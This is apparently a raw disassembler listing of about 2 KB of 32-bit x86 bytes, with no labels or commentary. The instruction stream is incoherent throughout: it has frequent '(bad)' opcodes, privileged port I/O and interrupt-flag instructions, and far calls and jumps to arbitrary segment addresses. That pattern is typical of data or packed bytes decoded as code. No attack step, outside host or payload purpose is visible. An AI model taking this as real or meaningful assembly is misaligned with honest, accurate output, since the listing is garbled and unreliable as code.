  419bb9:	cmc    
  419bba:	cmp    eax,0xe6669379
  419bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bc0:	pop    es
  419bc1:	ja     0x419c1d
  419bc3:	call   FWORD PTR [eax-0x51605309]
  419bc9:	and    ebx,DWORD PTR [edx-0x65]
  419bcc:	jb     0x419be8
  419bce:	cmp    esp,edx
  419bd0:	lds    esp,FWORD PTR [esp+ecx*2+0x3679f0bb]
  419bd7:	data16 mov BYTE PTR [edx-0x230b1882],0xab
  419bdf:	jb     0x419c34
  419be1:	push   eax
  419be2:	inc    esi
  419be3:	imul   esp,esi,0xa16efa2c
  419be9:	cld    
  419bea:	in     al,dx
  419beb:	ins    DWORD PTR es:[edi],dx
  419bec:	inc    ecx
  419bed:	mov    ecx,0xac7974a7
  419bf2:	repz push ecx
  419bf4:	stos   BYTE PTR es:[edi],al
  419bf5:	sub    DWORD PTR [ebx-0x56],esi
  419bf8:	push   ebx
  419bf9:	mov    ds:0x12dba67e,al
  419bfe:	xchg   DWORD PTR [bp-0x7533],edi
  419c03:	rcl    DWORD PTR [ecx],1
  419c05:	pop    ds
  419c06:	push   bp
  419c08:	sti    
  419c09:	pop    ss
  419c0a:	pop    ds
  419c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c0c:	ss retf 0x1aaa
  419c10:	stc    
  419c11:	mov    bl,0x22
  419c13:	jmp    0x34526998
  419c18:	(bad)  
  419c19:	out    dx,al
  419c1a:	xchg   ebx,eax
  419c1b:	push   esp
  419c1c:	fimul  WORD PTR [esi]
  419c1e:	adc    al,0xdc
  419c20:	push   ds
  419c21:	mov    esp,0x44614eb1
  419c26:	push   edi
  419c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c28:	adc    esi,edi
  419c2a:	es in  al,0xa2
  419c2d:	pop    eax
  419c2e:	adc    ch,BYTE PTR [ebp-0x330db105]
  419c34:	xor    eax,edi
  419c36:	inc    ebx
  419c37:	mov    ds:0x2261832f,eax
  419c3c:	pop    edi
  419c3d:	pop    edx
  419c3e:	rcl    BYTE PTR [edi-0x68],0xfa
  419c42:	std    
  419c43:	mov    eax,edi
  419c45:	nop
  419c46:	mov    ecx,DWORD PTR [ebx-0x7da7b514]
  419c4c:	fcmovu st,st(4)
  419c4e:	inc    esp
  419c4f:	pop    edi
  419c50:	retf   
  419c51:	inc    esp
  419c52:	mov    WORD PTR [ecx],es
  419c54:	in     al,0xfa
  419c56:	jl     0x419bed
  419c58:	or     BYTE PTR [ecx+0x24],ah
  419c5b:	add    edi,DWORD PTR [esi-0xb]
  419c5e:	cwde   
  419c5f:	mov    eax,ds:0xf0ac153b
  419c64:	in     eax,0xba
  419c66:	sbb    eax,0x340269d6
  419c6b:	sub    ch,ch
  419c6d:	(bad)  
  419c6e:	sbb    edx,DWORD PTR [ecx]
  419c70:	lahf   
  419c71:	je     0x419c26
  419c73:	fisub  DWORD PTR [esi]
  419c75:	iret   
  419c76:	cmc    
  419c77:	mov    cl,0x70
  419c79:	daa    
  419c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c7b:	cdq    
  419c7c:	xor    eax,0xabd1850f
  419c81:	push   eax
  419c82:	sub    al,0x10
  419c84:	jl     0x419c65
  419c86:	std    
  419c87:	sbb    BYTE PTR [ebx-0x61],ah
  419c8a:	lds    edx,FWORD PTR [ebx-0x54]
  419c8d:	or     BYTE PTR [edi+0x3fc2667b],ch
  419c93:	xchg   edx,eax
  419c94:	and    BYTE PTR [edx-0xa],cl
	...
  419d13:	add    BYTE PTR [eax],ah
  419d15:	lahf   
  419d16:	arpl   WORD PTR [ebp-0x40110201],cx
  419d1c:	mov    gs,WORD PTR [ebx+0x41cd4100]
  419d22:	imul   ebx,DWORD PTR [edx+0x13d48],0x76b
  419d2c:	fisttp WORD PTR ds:0xcfd4a503
  419d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d33:	cmp    eax,0xfd9a3382
  419d38:	mov    esp,0xaffaad59
  419d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d3e:	imul   ebx,DWORD PTR [edx+0x7b],0xfffffff4
  419d42:	push   edi
  419d43:	int3   
  419d44:	pop    es
  419d45:	(bad)  
  419d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d47:	ror    DWORD PTR [edi+0x56914fec],0x5e
  419d4e:	inc    esp
  419d4f:	xchg   edi,eax
  419d50:	push   ebx
  419d51:	or     BYTE PTR [edx-0x21],ch
  419d54:	aad    0x9f
  419d56:	add    BYTE PTR ds:0xd5161288,al
  419d5c:	popa   
  419d5d:	(bad)  
  419d5e:	dec    ebx
  419d5f:	mov    edx,0xb22d8baa
  419d64:	(bad)  
  419d65:	fsubr  DWORD PTR [edi]
  419d67:	mov    esp,0xc1022439
  419d6c:	out    dx,eax
  419d6d:	rcl    ch,1
  419d6f:	sahf   
  419d70:	xchg   edx,eax
  419d71:	inc    esi
  419d72:	es dec edx
  419d74:	and    al,0xb4
  419d76:	loopne 0x419d4d
  419d78:	sbb    BYTE PTR [esi+0x66],0xa7
  419d7c:	out    0x67,eax
  419d7e:	jne    0x419d16
  419d80:	test   al,0x8
  419d82:	pop    ebp
  419d83:	lahf   
  419d84:	cld    
  419d85:	cmp    eax,0x797320cd
  419d8a:	push   ds
  419d8b:	test   al,0x55
  419d8d:	jle    0x419d4a
  419d8f:	xor    al,0xd6
  419d91:	dec    esi
  419d92:	in     eax,dx
  419d93:	jecxz  0x419df4
  419d95:	add    ebp,ebp
  419d97:	fistp  QWORD PTR [ebx-0x324b8958]
  419d9d:	lea    esi,cs:[edi-0x3ce97cae]
  419da4:	cs fdivp st(0),st
  419da7:	sub    DWORD PTR [ecx-0x3d],ebp
  419daa:	ficom  WORD PTR [ecx]
  419dac:	mov    eax,0x437607a1
  419db1:	jns    0x419df1
  419db3:	lahf   
  419db4:	inc    edi
  419db5:	inc    edi
  419db6:	push   esi
  419db7:	fidivr WORD PTR [ecx+0x6053a8b4]
  419dbd:	mov    ds:0xbb761d81,al
  419dc2:	dec    esp
  419dc3:	aas    
  419dc4:	inc    edi
  419dc5:	push   edx
  419dc6:	jle    0x419d6f
  419dc8:	mov    al,0x2e
  419dca:	shl    BYTE PTR [edi],0x74
  419dcd:	aas    
  419dce:	out    dx,al
  419dcf:	mov    al,ds:0xb632fa91
  419dd4:	jns    0x419d77
  419dd6:	push   ecx
  419dd7:	in     al,dx
  419dd8:	leave  
  419dd9:	push   cs
  419dda:	xchg   ebx,eax
  419ddb:	sbb    edx,DWORD PTR gs:[ecx+0x72ed0ee6]
  419de2:	icebp  
  419de3:	loop   0x419de2
  419de5:	dec    eax
  419de6:	shl    BYTE PTR [eax],1
  419de8:	push   ebx
  419de9:	stc    
  419dea:	test   BYTE PTR [edi],ah
  419dec:	jmp    0x904eac8b
  419df1:	push   ss
  419df2:	lods   al,BYTE PTR ds:[esi]
  419df3:	mov    edx,0x9937c956
  419df8:	ja     0x419e25
  419dfa:	push   es
  419dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dfc:	pop    ebx
  419dfd:	dec    ebx
  419dfe:	sbb    eax,0x93321c10
  419e03:	sbb    al,0x7
  419e05:	prefetchw BYTE PTR [edi]
  419e08:	push   edx
  419e09:	or     al,0xbc
  419e0b:	inc    edx
  419e0c:	aas    
  419e0d:	push   esi
  419e0e:	jb     0x419e6d
  419e10:	lock cmp al,BYTE PTR [ebx-0x2253fb2b]
  419e17:	sub    esp,DWORD PTR [ebp-0xc]
  419e1a:	(bad)  
  419e1b:	sbb    al,0x96
  419e1d:	jne    0x419e0f
  419e1f:	push   edi
  419e20:	sub    eax,0x860aa8f1
  419e25:	jmp    0xb5a1:0x6f02a3e8
  419e2c:	or     dl,BYTE PTR [edi+ebp*8-0x15]
  419e30:	lods   al,BYTE PTR ds:[esi]
  419e31:	aas    
  419e32:	repnz xlat BYTE PTR ds:[ebx]
  419e34:	scas   al,BYTE PTR es:[edi]
  419e35:	lods   eax,DWORD PTR ds:[esi]
  419e36:	imul   BYTE PTR [esi-0x1c778a52]
  419e3c:	push   esp
  419e3d:	cmp    BYTE PTR [ebx+ebp*2-0x602bef12],ah
  419e44:	cmp    ebp,ebx
  419e46:	jge    0x419eba
  419e48:	ins    DWORD PTR es:[edi],dx
  419e49:	xchg   edx,eax
  419e4a:	add    eax,0x4d11bae4
  419e4f:	jo     0x419e6e
  419e51:	cmc    
  419e52:	push   cs
  419e53:	lea    ecx,[ebx-0x7a9d7db1]
  419e59:	xor    ebp,DWORD PTR [ebx-0x7d]
  419e5c:	in     al,dx
  419e5d:	xor    eax,DWORD PTR [ebp+0x26]
  419e60:	cmp    edi,DWORD PTR [ecx+0x38eff37b]
  419e66:	out    0x3d,al
  419e68:	or     cl,BYTE PTR [ebp+0x11]
  419e6b:	or     cl,BYTE PTR [eax-0xb]
  419e6e:	pop    ss
  419e6f:	mov    cl,0x92
  419e71:	xor    esp,ebx
  419e73:	ds jmp 0x419e05
  419e76:	add    eax,0xd15d7d3
  419e7b:	fdiv   QWORD PTR [edx+0xa]
  419e7e:	pop    ebx
  419e7f:	dec    ebp
  419e80:	adc    bl,al
  419e82:	js     0x419e92
  419e84:	and    al,0x71
  419e86:	aam    0x32
  419e88:	daa    
  419e89:	mov    ebp,0xfef9d48
  419e8e:	imul   esp
  419e90:	cli    
  419e91:	push   edx
  419e92:	and    ah,BYTE PTR [ecx+0x20f4664a]
  419e98:	push   edx
  419e99:	push   ecx
  419e9a:	ins    DWORD PTR es:[edi],dx
  419e9b:	xor    DWORD PTR [esi+0x8],ecx
  419e9e:	fs mov ebx,0xd94212d9
  419ea4:	rcr    BYTE PTR [esi+0xc9ad754],cl
  419eaa:	adc    BYTE PTR [ecx],0x9e
  419ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eae:	out    dx,eax
  419eaf:	aam    0x6d
  419eb1:	push   ebp
  419eb2:	inc    ebx
  419eb3:	leave  
  419eb4:	sub    ch,BYTE PTR [eax+edi*8]
  419eb7:	test   eax,0xd9d5e3e7
  419ebc:	dec    ebx
  419ebd:	aaa    
  419ebe:	fwait
  419ebf:	inc    ecx
  419ec0:	sahf   
  419ec1:	xor    BYTE PTR [ebp+0x2c],al
  419ec4:	push   cs
  419ec5:	lds    edi,FWORD PTR [ecx+0x15]
  419ec8:	jmp    0x844dda04
  419ecd:	xchg   edx,eax
  419ece:	je     0x419f2b
  419ed0:	lahf   
  419ed1:	xchg   ebp,eax
  419ed2:	mov    esp,0xa9a85f88
  419ed7:	mov    edi,0x95aaa337
  419edc:	sbb    BYTE PTR [edi-0x68],dh
  419edf:	daa    
  419ee0:	pop    ebx
  419ee1:	mov    ds:0x1cd9253a,al
  419ee6:	cmp    ah,cl
  419ee8:	dec    ebp
  419ee9:	sbb    eax,0xd5fc443
  419eee:	pop    ds
  419eef:	xchg   ebx,eax
  419ef0:	mov    cl,0x22
  419ef2:	jo     0x419ece
  419ef4:	out    0x56,al
  419ef6:	xchg   edx,eax
  419ef7:	fistp  QWORD PTR [ecx+ebp*4+0x3d]
  419efb:	fst    DWORD PTR [esp+edi*4+0x25]
  419eff:	ret    0x2f36
  419f02:	mov    ch,BYTE PTR [ecx]
  419f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f06:	mov    ds:0x23cdc6b3,al
  419f0b:	fnstenv [edi-0x30]
  419f0e:	xor    bl,BYTE PTR [esi+0x3]
  419f11:	push   eax
  419f12:	sub    DWORD PTR [ecx-0x5f],ebx
  419f15:	dec    edx
  419f16:	mov    ecx,0xaf6b9455
  419f1b:	xor    ah,ch
  419f1d:	(bad)  
  419f1e:	cld    
  419f1f:	loop   0x419f95
  419f21:	lea    ebx,[edx]
  419f23:	mov    esp,0x931b070a
  419f28:	dec    eax
  419f29:	fmul   DWORD PTR [edi+0x6f]
  419f2c:	fimul  DWORD PTR [ecx-0x51]
  419f2f:	xchg   esp,eax
  419f30:	test   eax,0x8b144d58
  419f35:	cmp    ecx,edx
  419f37:	rcr    DWORD PTR [esi-0x13b06832],0x56
  419f3e:	and    al,0x9
  419f40:	outs   dx,BYTE PTR ds:[esi]
  419f41:	loope  0x419f89
  419f43:	sub    edx,ecx
  419f45:	pop    ss
  419f46:	mov    bl,0x2d
  419f48:	test   eax,0x150cf078
  419f4d:	daa    
  419f4e:	pop    ecx
  419f4f:	popa   
  419f50:	and    eax,0xca4f4095
  419f55:	enter  0x6b7c,0xf1
  419f59:	outs   dx,BYTE PTR ds:[esi]
  419f5a:	fistp  DWORD PTR [edx+0x40729d8c]
  419f60:	call   0xc0e6dce3
  419f65:	adc    al,0xad
  419f67:	push   0xffffff80
  419f69:	jae    0x419f59
  419f6b:	push   0x4
  419f6d:	add    eax,0x2bd5dfe6
  419f72:	push   ss
  419f73:	shl    BYTE PTR [esp+esi*1],cl
  419f76:	ret    
  419f77:	or     esp,DWORD PTR [esi]
  419f79:	mov    dh,0x2f
  419f7b:	mov    esi,0x8a3ffdf1
  419f80:	xor    ebx,DWORD PTR [eax-0x4]
  419f83:	fwait
  419f84:	test   al,0x22
  419f86:	scas   eax,DWORD PTR es:[edi]
  419f87:	jne    0x419f72
  419f89:	test   al,0xb0
  419f8b:	inc    ecx
  419f8c:	dec    ebx
  419f8d:	int    0xd1
  419f8f:	imul   esp,DWORD PTR [ecx-0x4b],0xffffffae
  419f93:	(bad)  
  419f94:	stos   BYTE PTR es:[edi],al
  419f95:	sub    eax,0x30febaea
  419f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f9b:	loope  0x419f72
  419f9d:	xor    eax,0x796bb46
  419fa2:	sub    al,0x31
  419fa4:	ins    DWORD PTR es:[edi],dx
  419fa5:	or     ebp,ebp
  419fa7:	in     eax,0x2c
  419fa9:	jp     0x41a007
  419fab:	cmp    DWORD PTR [edx+0x3ff7506],ecx
  419fb1:	call   0xadd5726f
  419fb6:	dec    eax
  419fb7:	addr16 leave 
  419fb9:	pop    ds
  419fba:	es test al,0x99
  419fbd:	mov    edx,0x5577445c
  419fc2:	jl     0x419fdf
  419fc4:	popf   
  419fc5:	mov    WORD PTR [ecx-0xdc80a8b],?
  419fcb:	call   0x5e27:0xa293d495
  419fd2:	call   0xe9ac:0x1d8c6085
  419fd9:	std    
  419fda:	or     dh,dh
  419fdc:	mov    edx,0xf73b8932
  419fe1:	mov    ecx,0x4486151f
  419fe6:	int3   
  419fe7:	fld    TBYTE PTR [ebp+0x74153733]
  419fed:	popf   
  419fee:	idiv   BYTE PTR [edi+esi*2]
  419ff1:	retf   
  419ff2:	xor    eax,0x92ed1668
  419ff7:	mov    ah,0x6
  419ff9:	retf   
  419ffa:	xchg   ebp,eax
  419ffb:	xor    esi,DWORD PTR [eax-0x20]
  419ffe:	sbb    esi,DWORD PTR [ebx]
  41a000:	fmul   DWORD PTR [ebx+0x4aa69e]
  41a006:	pop    es
  41a007:	stos   BYTE PTR es:[edi],al
  41a008:	rcr    ecx,cl
  41a00a:	sbb    DWORD PTR [edx],esi
  41a00c:	mov    BYTE PTR [ebx+0x2288ea23],ch
  41a012:	cmp    ah,dh
  41a014:	xchg   BYTE PTR [ebx-0x19],al
  41a017:	adc    BYTE PTR [ebx],bl
  41a019:	adc    eax,0xb4e53a5f
  41a01e:	hlt    
  41a01f:	jl     0x41a060
  41a021:	into   
  41a022:	pop    ebp
  41a023:	jmp    0x419fc4
  41a025:	pop    ebx
  41a026:	mov    ds:0xffc4600f,al
  41a02b:	shr    ecx,cl
  41a02d:	inc    edx
  41a02e:	or     esi,DWORD PTR [ecx+ecx*2+0x58318a0c]
  41a035:	xor    dl,BYTE PTR [ecx+0x316b2def]
  41a03b:	les    esp,FWORD PTR [eax]
  41a03d:	or     eax,0x7ad233fc
  41a042:	push   cs
  41a043:	rcl    esp,cl
  41a045:	cmp    BYTE PTR [ebp-0xa],ah
  41a048:	dec    ebx
  41a049:	cmc    
  41a04a:	dec    esp
  41a04b:	pop    ss
  41a04c:	lds    ebx,FWORD PTR cs:[eax+0x4cc83e2b]
  41a053:	sbb    eax,DWORD PTR [ebp+0x34ce3ca7]
  41a059:	pop    edi
  41a05a:	jne    0x41a0a9
  41a05c:	or     al,0x6a
  41a05e:	test   DWORD PTR [ecx],ebp
  41a060:	lea    esp,[ecx]
  41a062:	xchg   DWORD PTR [ecx+edi*2-0x12],esi
  41a066:	jo     0x419fed
  41a068:	aad    0x8d
  41a06a:	cdq    
  41a06b:	test   eax,0x8631eab
  41a070:	gs or  ebp,esp
  41a073:	push   ebx
  41a074:	push   es
  41a075:	pop    ebp
  41a076:	inc    eax
  41a077:	dec    esi
  41a078:	leave  
  41a079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a07a:	push   ebp
  41a07b:	cmp    BYTE PTR [ebp-0x48],0xa8
  41a07f:	cmp    eax,DWORD PTR [ebx]
  41a081:	int    0x3c
  41a083:	xor    eax,0xb00275af
  41a088:	cwde   
  41a089:	dec    edx
  41a08a:	lods   eax,DWORD PTR ds:[esi]
  41a08b:	mov    eax,ds:0xd9597915
  41a090:	lods   eax,DWORD PTR ds:[esi]
  41a091:	out    0xe9,eax
  41a093:	dec    ecx
  41a094:	add    al,ch
  41a096:	test   eax,0xfd990917
  41a09b:	xor    al,0x9c
  41a09d:	das    
  41a09e:	lahf   
  41a09f:	aad    0x79
  41a0a1:	add    DWORD PTR [ebx+0x4ae226fc],esp
  41a0a7:	leave  
  41a0a8:	jnp    0x41a045
  41a0aa:	fs sbb eax,0x8478da89
  41a0b0:	jb     0x41a0a8
  41a0b2:	xchg   ebp,eax
  41a0b3:	repnz xlat BYTE PTR ds:[ebx]
  41a0b5:	bound  ebx,QWORD PTR [edi-0xb5f4b46]
  41a0bb:	imul   edx,edx,0x641c757b
  41a0c1:	out    dx,eax
  41a0c2:	test   eax,0x9be523e8
  41a0c7:	mov    ebx,0xda33b5b4
  41a0cc:	sti    
  41a0cd:	mov    esp,0x9724d54
  41a0d2:	inc    edi
  41a0d3:	jne    0x41a130
  41a0d5:	(bad)  
  41a0d7:	cdq    
  41a0d8:	pop    es
  41a0d9:	cli    
  41a0da:	les    edi,FWORD PTR [ebp-0x42]
  41a0dd:	mov    ds:0xefbf0e4a,al
  41a0e2:	retf   
  41a0e3:	imul   eax,DWORD PTR [edi+edi*2],0xffffff97
  41a0e7:	(bad)  
  41a0e8:	xor    ah,dl
  41a0ea:	div    BYTE PTR [eax+0x6b]
  41a0ed:	les    ecx,FWORD PTR [ebx]
  41a0ef:	sbb    al,0xde
  41a0f1:	inc    ebp
  41a0f2:	sub    eax,0xab5e2574
  41a0f7:	push   ss
  41a0f8:	xor    ecx,DWORD PTR [edx-0x2d]
  41a0fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0fc:	or     ebp,DWORD PTR [edi+0x68a9ec1b]
  41a102:	dec    eax
  41a103:	push   ecx
  41a104:	jmp    0xed9e:0x6818b240
  41a10b:	pop    ss
  41a10c:	fnsave [ebp-0x31]
  41a10f:	mov    al,0xd9
  41a111:	push   es
  41a112:	pop    ds
  41a113:	(bad)  [edx-0x69d462dc]
  41a119:	jge    0x41a112
  41a11b:	ror    ebp,0xf0
  41a11e:	mov    ebp,0xeea1b42e
  41a123:	sub    ch,BYTE PTR [esi]
  41a125:	xor    al,0x7e
  41a127:	es pop ebx
  41a129:	jg     0x41a0d5
  41a12b:	add    DWORD PTR [ebp+ebp*8+0x4753a29e],0x31b7ff6b
  41a136:	sbb    DWORD PTR [edx-0x19],esi
  41a139:	or     dh,BYTE PTR [esp+edi*2+0x1f]
  41a13d:	mov    edi,DWORD PTR [eax-0x30567694]
  41a143:	push   esp
  41a144:	fwait
  41a145:	mov    ds:0xa88f208d,eax
  41a14a:	repnz ins DWORD PTR es:[edi],dx
  41a14c:	imul   ebx,DWORD PTR [eax-0x1197f1bb],0x18e95b07
  41a156:	cmp    eax,0x5187734d
  41a15b:	jl     0x41a0ea
  41a15d:	mov    esi,0x2e375c94
  41a162:	sub    ebx,DWORD PTR [edx]
  41a164:	pop    esp
  41a165:	loop   0x41a0fd
  41a167:	(bad)  
  41a168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a169:	aad    0xaa
  41a16b:	loop   0x41a17e
  41a16d:	or     BYTE PTR ds:0x7c2407d0,dl
  41a173:	test   al,0x47
  41a175:	call   DWORD PTR [ecx+0xb]
  41a178:	cmp    eax,0x9ec9f1be
  41a17d:	in     al,0x38
  41a17f:	xor    BYTE PTR [esi-0x19b1b1a4],0xf8
  41a186:	sbb    al,0xcb
  41a188:	ins    BYTE PTR es:[edi],dx
  41a189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a18a:	and    BYTE PTR [ebp+ebp*1-0x482f68c8],dl
  41a191:	jne    0x41a178
  41a193:	xlat   BYTE PTR ds:[ebx]
  41a194:	outs   dx,BYTE PTR ds:[esi]
  41a195:	xchg   BYTE PTR ds:0xa9d6e89e,bl
  41a19b:	pop    eax
  41a19c:	or     ch,BYTE PTR ss:[esi+0x6c]
  41a1a0:	sbb    BYTE PTR [ebx-0x64],ah
  41a1a3:	sub    eax,DWORD PTR ds:0x96f88856
  41a1a9:	cmp    esp,DWORD PTR [esi+ecx*1]
  41a1ac:	ja     0x41a136
  41a1ae:	inc    ecx
  41a1af:	xchg   ebx,eax
  41a1b0:	xor    al,cl
  41a1b2:	mov    ebp,0xaaf16e04
  41a1b7:	call   0x8f77:0x90d1e066
  41a1be:	loopne 0x41a1c3
  41a1c0:	jmp    0x41a1c1
  41a1c2:	inc    ebx
  41a1c3:	arpl   WORD PTR [ebp+edx*4-0x664cfae5],cx
  41a1ca:	and    BYTE PTR [edx+0x2b49f1a9],ah
  41a1d0:	mov    eax,ds:0xce45fdc5
  41a1d5:	mov    edx,0x5285da90
  41a1da:	push   ebp
  41a1db:	arpl   WORD PTR [ebx+0x7e3e02f0],bp
  41a1e1:	frstor [esi+edi*1+0x1]
  41a1e5:	xor    eax,0x74c78a21
  41a1ea:	fist   WORD PTR [ebp+edi*1-0x1ab23572]
  41a1f1:	out    0x7b,eax
  41a1f3:	jecxz  0x41a1ff
  41a1f5:	repz dec esp
  41a1f7:	inc    eax
  41a1f8:	xor    BYTE PTR [edx-0x4a],bl
  41a1fb:	dec    esp
  41a1fc:	out    dx,eax
  41a1fd:	dec    ecx
  41a1fe:	pop    ds
  41a1ff:	enter  0x80a5,0xe1
  41a203:	pop    edi
  41a204:	mov    ebx,0x14174839
  41a209:	in     al,dx
  41a20a:	mov    ah,cl
  41a20c:	jo     0x41a217
  41a20e:	div    DWORD PTR [eax]
  41a210:	or     eax,0xf1acf65
  41a215:	jg     0x41a1f1
  41a217:	into   
  41a218:	jns    0x41a1b1
  41a21a:	and    DWORD PTR [esi-0x30],edx
  41a21d:	adc    al,0xdf
  41a21f:	mov    fs,WORD PTR [edi-0x4ab32db7]
  41a225:	mov    al,0x26
  41a227:	ds retf 0x8517
  41a22b:	inc    edx
  41a22c:	and    edi,0x2d
  41a22f:	adc    DWORD PTR [ecx],0xa9f7e8b4
  41a235:	mov    dl,0x53
  41a237:	or     ah,BYTE PTR [edx+0x3c43557f]
  41a23d:	push   ebp
  41a23e:	or     al,0xdf
  41a240:	mov    ebx,0xb7d818e7
  41a245:	inc    ebx
  41a246:	jl     0x41a1cd
  41a248:	jnp    0x41a21a
  41a24a:	scas   eax,DWORD PTR es:[edi]
  41a24b:	sub    ah,BYTE PTR [edx-0x6802e2dd]
  41a251:	and    al,BYTE PTR [ebx]
  41a253:	dec    esi
  41a254:	test   eax,0x539f526f
  41a259:	aam    0x9e
  41a25b:	push   esi
  41a25c:	lods   al,BYTE PTR ds:[esi]
  41a25d:	(bad)  
  41a25e:	hlt    
  41a25f:	shr    DWORD PTR [ecx],1
  41a261:	hlt    
  41a262:	xor    eax,0x74b63dfd
  41a267:	(bad)  
  41a269:	leave  
  41a26a:	sub    BYTE PTR [edx],0x95
  41a26d:	xor    eax,0x433f4943
  41a272:	xchg   ecx,edi
  41a274:	lods   al,BYTE PTR ds:[esi]
  41a275:	sbb    BYTE PTR [ecx-0x22],dl
  41a278:	fcomp  DWORD PTR [edx]
  41a27a:	push   ebx
  41a27b:	sub    ebp,ecx
  41a27d:	and    eax,0x4f69ff1d
  41a282:	push   esp
  41a283:	aam    0x98
  41a285:	repz ja 0x41a2ba
  41a288:	xchg   edi,eax
  41a289:	mov    eax,0x49491bf1
  41a28e:	hlt    
  41a28f:	jge    0x41a2ca
  41a291:	cs lock (bad) 
  41a294:	(bad)  
  41a295:	fidivr DWORD PTR [edx+0x614c0d38]
  41a29b:	push   es
  41a29c:	lahf   
  41a29d:	in     eax,0xe1
  41a29f:	mov    edx,0x98841e2e
  41a2a4:	mov    DWORD PTR [ebx-0x5f],esp
  41a2a7:	mov    bl,ah
  41a2a9:	loope  0x41a259
  41a2ab:	cmp    BYTE PTR [edx+0x65],dh
  41a2ae:	imul   edx,DWORD PTR [edi+edx*8+0x18b8c9d5],0xec45e3d1
  41a2b9:	sbb    eax,0x75f25c62
  41a2be:	mov    ch,0xfa
  41a2c0:	mov    al,0x6f
  41a2c2:	imul   ebp,DWORD PTR [ebx+edi*8],0x1385d87e
  41a2c9:	pop    esp
  41a2ca:	aas    
  41a2cb:	(bad)  [edi+eiz*1+0x53]
  41a2cf:	aas    
  41a2d0:	dec    ebx
  41a2d1:	xor    edx,DWORD PTR [edx+0x6c]
  41a2d4:	cs add al,0x35
  41a2d7:	out    0x62,eax
  41a2d9:	xor    al,0xdd
  41a2db:	test   al,0xb0
  41a2dd:	ror    BYTE PTR [esi+ebp*2-0x5d63324d],cl
  41a2e4:	pop    es
  41a2e5:	push   eax
  41a2e6:	popf   
  41a2e7:	aad    0x5e
  41a2e9:	mov    ds:0xc3dfba55,eax
  41a2ee:	je     0x41a29d
  41a2f0:	ja     0x41a2dc
  41a2f2:	mov    bh,0x29
  41a2f4:	mov    cl,0x41
  41a2f6:	addr16 repz std 
  41a2f9:	push   es
  41a2fa:	jp     0x41a33d
  41a2fc:	ins    DWORD PTR es:[edi],dx
  41a2fd:	cmp    ah,cl
  41a2ff:	jnp    0x41a33b
  41a301:	mov    ecx,0xc1fea187
  41a306:	neg    DWORD PTR [ecx-0x5f]
  41a309:	jg     0x41a2cd
  41a30b:	push   ebx
  41a30c:	cmp    edi,edx
  41a30e:	repnz scas eax,DWORD PTR es:[edi]
  41a310:	sbb    eax,0x4e832eef
  41a315:	xor    eax,0xf3384c44
  41a31a:	mov    esi,0x45bb1326
  41a31f:	out    dx,al
  41a320:	push   edi
  41a321:	rcr    DWORD PTR [edx+0x18],1
  41a324:	mov    ecx,0x329ea1a9
  41a329:	cmc    
  41a32a:	push   esp
  41a32b:	test   DWORD PTR [ecx],ebp
  41a32d:	sub    bl,ch
  41a32f:	sub    bh,cl
  41a331:	imul   ebx,ecx,0x2a
  41a334:	(bad)  
  41a335:	out    0xa1,al
  41a337:	les    edi,FWORD PTR [ebx]
  41a339:	xor    cl,BYTE PTR [esp+edx*8+0x1252cda0]
  41a340:	mov    edi,0x1785fe07
  41a345:	test   esi,eax
  41a347:	and    al,0xcc
  41a349:	add    al,0x5f
  41a34b:	or     al,0x72
  41a34d:	adc    al,BYTE PTR [edx+0xbaefe3b]
  41a353:	mov    edi,0x88d0ac08
  41a358:	sbb    eax,0x1b614275
  41a35d:	lods   eax,DWORD PTR ds:[esi]
  41a35e:	push   ds
  41a35f:	ret    
  41a360:	arpl   WORD PTR [edx+0x75e2e663],bp
  41a366:	mov    dh,0x3a
  41a368:	jb     0x41a30f
  41a36a:	dec    sp
  41a36c:	push   ecx
  41a36d:	push   ss
  41a36e:	and    DWORD PTR [ecx-0x330c0b15],ebp
  41a374:	dec    BYTE PTR [eax+0x597aebc1]
  41a37a:	xchg   esi,eax
  41a37b:	arpl   WORD PTR es:[ebx+0x4a0e52e],sp
  41a382:	outs   dx,DWORD PTR ds:[esi]
  41a383:	call   0xe508:0x28cd3460
  41a38a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a38b:	mov    al,0xde
  41a38d:	mov    ds:0x1659ffef,eax
  41a392:	push   ss
  41a393:	stos   BYTE PTR es:[edi],al
  41a394:	sar    ah,1
  41a396:	inc    edx
  41a397:	jp     0x41a348
  41a399:	sti    
  41a39a:	push   0x28
  41a39c:	pop    eax
  41a39d:	and    bh,BYTE PTR es:[ebx+edx*2+0x1f47f500]
  41a3a5:	test   eax,0xf558bec3
  41a3aa:	cli    
  41a3ab:	imul   edx,eax,0xe67fb0fb
  41a3b1:	(bad)  
  41a3b2:	mov    cl,0x21
  41a3b4:	ret    
  41a3b5:	jg     0x41a3fa
  41a3b7:	inc    ebp
  41a3b8:	dec    eax
  41a3b9:	int3   
  41a3ba:	fisttp DWORD PTR ds:0x90d0c31f
  41a3c0:	adc    ecx,DWORD PTR [edi+edx*1]
  41a3c3:	jp     0x41a3a5
  41a3c5:	push   eax
  41a3c6:	out    0x18,eax
  41a3c8:	mov    dl,BYTE PTR gs:[ebx]
  41a3cb:	sbb    esi,DWORD PTR [edx+0x3802c5dd]
  41a3d1:	test   DWORD PTR [edi+0x7f18bb37],ebp
  41a3d7:	or     BYTE PTR [esi+0x2c6a7bb5],bl
  41a3dd:	jno    0x41a421
  41a3df:	mov    ds:0x5a0de2d2,eax
  41a3e4:	adc    BYTE PTR [eax+0x7e],cl
  41a3e7:	or     edx,DWORD PTR ds:0x533162d
  41a3ed:	push   sp
